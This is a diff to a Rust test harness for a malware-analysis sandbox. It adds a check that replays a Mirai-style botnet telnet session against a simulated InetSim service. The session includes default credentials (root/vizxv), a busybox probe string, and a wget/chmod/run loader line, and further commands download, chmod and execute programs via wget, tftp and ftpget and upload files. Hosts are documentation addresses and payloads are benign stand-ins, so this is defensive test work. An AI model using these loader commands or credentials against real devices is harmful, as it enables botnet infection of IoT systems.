@@ -39,8 +39,15 @@
 //!   per-minute limit, the open-connection cap, a browser-like burst, the
 //!   filter turned off, and the route time limit.
 //!
-//! CASE names limit the VMs (`routed`, `nat`, `none`, `filter`; without
-//! names the first three). Every check prints a PASS or FAIL line; `route-check.md` in the data folder holds the table.
+//! * inetsim (only when named): the InetSim route's built-in services on a
+//!   Routed VM. A BusyBox shell logs into a fake telnet device with `nc` and
+//!   types a loader; another fetches programs with `wget`, `tftp -g` and
+//!   `ftpget`, chmods and runs them (each is the stand-in, which exits 0) and
+//!   uploads a file with `ftpput` and `tftp -p`. The run's `inetsim.json`
+//!   must hold the session, the downloads and the transfers.
+//!
+//! CASE names limit the VMs (`routed`, `nat`, `none`, `filter`, `inetsim`;
+//! without names the first three). Every check prints a PASS or FAIL line; `route-check.md` in the data folder holds the table.
 //! The data folder must be new and disposable.
 //!
 //! Started as `route-check -c CONFIG` the program is the fake wireproxy of
@@ -1409,7 +1416,7 @@ fn check(bundle: &str, data: &str, probe: &str, only: &[&str]) -> Result<(), Str
     let mut table = Table::default();
     let wanted = |name: &str| {
         if only.is_empty() {
-            name != "filter"
+            name != "filter" && name != "inetsim"
         } else {
             only.contains(&name)
         }
@@ -1437,6 +1444,12 @@ fn check(bundle: &str, data: &str, probe: &str, only: &[&str]) -> Result<(), Str
         && let Err(error) = filter(&mut d, &mut table, &fakes, &data)
     {
         errors.push(format!("filter: {error}"));
+        let _ = d.stop();
+    }
+    if wanted("inetsim")
+        && let Err(error) = inetsim(&mut d, &mut table, &data)
+    {
+        errors.push(format!("inetsim: {error}"));
         let _ = d.stop();
     }
     let _ = d.command_for(Command::Close, 30);
@@ -1773,4 +1786,148 @@ fn filter(d: &mut Driver, t: &mut Table, fakes: &Fakes, data: &Path) -> Result<(
     )
     .ok();
     Ok(())
+}
+
+/// A shell command line as one run on the InetSim route.
+fn shell_run(d: &mut Driver, script: &str, seconds: u64) -> Result<Probed, String> {
+    let id = d.start(ExecRequest {
+        path: "/bin/sh".into(),
+        args: vec!["-c".into(), format!("{script}; echo ROUTE-END")],
+        uid: 0,
+        gid: 0,
+        route: Some(RouteKind::InetSim),
+        capture_network: true,
+        ..Default::default()
+    })?;
+    d.finish(id, seconds)
+}
+
+/// The run's InetSim log, once the run let go of its route.
+fn inetsim_log(run: &RunSummary) -> Option<antinomie_monitor_core::route::InetSimReport> {
+    let deadline = Instant::now() + Duration::from_secs(20);
+    loop {
+        if let Some(report) = antinomie_monitor_core::route::read_inetsim_report(&run.directory) {
+            return Some(report);
+        }
+        if Instant::now() >= deadline {
+            return None;
+        }
+        thread::sleep(Duration::from_millis(200));
+    }
+}
+
+/// The InetSim route's fake telnet devices, FTP, TFTP and stand-ins (benign
+/// BusyBox commands only).
+fn inetsim(d: &mut Driver, t: &mut Table, data: &Path) -> Result<(), String> {
+    let vm = "inetsim";
+    save_routes(data, &RouteConfig::default())?;
+    d.create_and_boot(vm_config(
+        "route check inetsim",
+        VmNetwork::Routed,
+        StealthProfile::default(),
+    ))?;
+    // A bot's telnet session, typed by a shell through nc.
+    let telnet = shell_run(
+        d,
+        "{ sleep 3; echo root; sleep 1; echo vizxv; sleep 1; echo enable; echo sh; \
+         echo '/bin/busybox ECCHI'; sleep 1; \
+         echo 'cd /tmp; wget http://198.51.100.9/bins/sora.x86 -O s; chmod 777 s; ./s telnet'; \
+         echo 'tftp -g -r t.arm7 198.51.100.10'; sleep 2; echo exit; sleep 1; } \
+         | nc 203.0.113.7 23 > /tmp/telnet.out 2>&1; \
+         grep -q 'ECCHI: applet not found' /tmp/telnet.out && echo 'ROUTE telnet.probe answered'; \
+         grep -q \"'s' saved\" /tmp/telnet.out && echo 'ROUTE telnet.wget answered'",
+        120,
+    )?;
+    t.check(
+        vm,
+        "telnet: the probe is answered",
+        telnet.fact("telnet.probe") == "answered",
+        telnet.fact("telnet.probe"),
+    );
+    t.check(
+        vm,
+        "telnet: the wget line is answered",
+        telnet.fact("telnet.wget") == "answered",
+        telnet.fact("telnet.wget"),
+    );
+    let log = inetsim_log(&telnet.run);
+    let session = log.as_ref().and_then(|log| log.sessions.first().cloned());
+    t.check(
+        vm,
+        "telnet: the session, logins and loader are logged",
+        session.as_ref().is_some_and(|s| {
+            s.endpoint == "203.0.113.7:23"
+                && s.logins
+                    .iter()
+                    .any(|l| l.user == "root" && l.password == "vizxv")
+                && s.lines.iter().any(|l| l.text == "/bin/busybox ECCHI")
+                && s.downloads
+                    .iter()
+                    .any(|d| d.url == "http://198.51.100.9/bins/sora.x86")
+                && s.downloads
+                    .iter()
+                    .any(|d| d.url == "tftp://198.51.100.10/t.arm7")
+                && s.executed
+                    .iter()
+                    .any(|x| x.contains("stand-in served by InetSim"))
+        }),
+        format!("{session:?}"),
+    );
+    // Downloads that run: wget, tftp and ftpget fetch a program, chmod it and
+    // run it; it is the stand-in, which exits 0. Then two uploads.
+    let fetch = shell_run(
+        d,
+        "cd /tmp; \
+         wget -q -O w.bin http://198.51.100.9/bins/w.x86 && chmod 755 w.bin && ./w.bin && echo 'ROUTE wget.run 0'; \
+         tftp -g -r t.arm7 -l t.bin 198.51.100.69 && chmod 755 t.bin && ./t.bin && echo 'ROUTE tftp.run 0'; \
+         ftpget 198.51.100.21 f.bin /pub/f.mips && chmod 755 f.bin && ./f.bin && echo 'ROUTE ftp.run 0'; \
+         echo 'benign upload' > u.txt; \
+         ftpput 198.51.100.21 u.txt u.txt && echo 'ROUTE ftpput ok'; \
+         tftp -p -l u.txt -r u.txt 198.51.100.69 && echo 'ROUTE tftpput ok'",
+        180,
+    )?;
+    for (key, want) in [
+        ("wget.run", "0"),
+        ("tftp.run", "0"),
+        ("ftp.run", "0"),
+        ("ftpput", "ok"),
+        ("tftpput", "ok"),
+    ] {
+        t.check(
+            vm,
+            &format!("downloads: {key}"),
+            fetch.fact(key) == want,
+            fetch.fact(key),
+        );
+    }
+    let log = inetsim_log(&fetch.run).unwrap_or_default();
+    let served = |protocol: &str| {
+        log.transfers.iter().any(|x| {
+            x.protocol == protocol
+                && x.direction == "download"
+                && x.served.starts_with("stand-in served by InetSim: program")
+        })
+    };
+    let uploaded = |protocol: &str| {
+        log.transfers.iter().any(|x| {
+            x.protocol == protocol
+                && x.direction == "upload"
+                && x.size == 14
+                && fs::read(fetch.run.directory.join(&x.artifact))
+                    .is_ok_and(|b| b == b"benign upload\n")
+        })
+    };
+    t.check(
+        vm,
+        "downloads: HTTP, TFTP and FTP served stand-ins, logged",
+        served("http") && served("tftp") && served("ftp"),
+        format!("{:?}", log.transfers),
+    );
+    t.check(
+        vm,
+        "downloads: FTP and TFTP uploads kept in the run's folder",
+        uploaded("ftp") && uploaded("tftp"),
+        format!("{:?}", log.transfers),
+    );
+    d.stop()
 }
